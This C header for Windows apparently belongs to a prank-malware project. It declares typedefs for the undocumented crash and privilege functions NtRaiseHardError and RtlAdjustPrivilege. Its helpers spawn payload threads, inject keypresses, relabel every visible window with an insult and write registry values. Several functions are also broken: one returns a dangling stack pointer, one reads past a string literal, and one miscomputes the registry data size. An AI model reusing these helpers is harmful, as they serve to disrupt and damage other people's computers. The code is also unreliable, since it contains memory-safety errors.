#pragma once

#include "Mapple.h"

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

HANDLE CreatePayload(LPTHREAD_START_ROUTINE payload)
{
	CreateThread(NULL, NULL, payload, NULL, NULL, NULL);
	return 0;
}

HANDLE CreateBytebeat(LPTHREAD_START_ROUTINE bytebeat)
{
	CreatePayload(bytebeat);
	return 0;
}

VOID Redraw()
{
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
}

VOID PressKey(WORD key, int time)
{
	INPUT inputs = { 0 };

	inputs.type = INPUT_KEYBOARD;
	inputs.ki.wVk = key;

	SendInput(1, (LPINPUT)&inputs, sizeof(INPUT));
	Sleep(time);

	inputs.ki.dwFlags = KEYEVENTF_KEYUP;

	SendInput(1, (LPINPUT)&inputs, sizeof(INPUT));
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
	CONST WCHAR* labelText = L"You are a asshole" + rand() % 1024;

	if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
	{
		SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
	}

	return 1;
}

VOID SetRegValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPBYTE lpData, DWORD cbData)
{
	HKEY phkResult;

	RegOpenKeyExW(hKey, lpSubKey, NULL, KEY_SET_VALUE, &phkResult);
	RegSetValueExW(phkResult, lpValueName, NULL, dwType, lpData, sizeof(lpData) * cbData);
	RegCloseKey(phkResult);
}

LPCWSTR GetDir()
{
	wchar_t buffer[MAX_PATH];
	GetModuleFileNameW(0, buffer, MAX_PATH);
	return (LPCWSTR)buffer;
}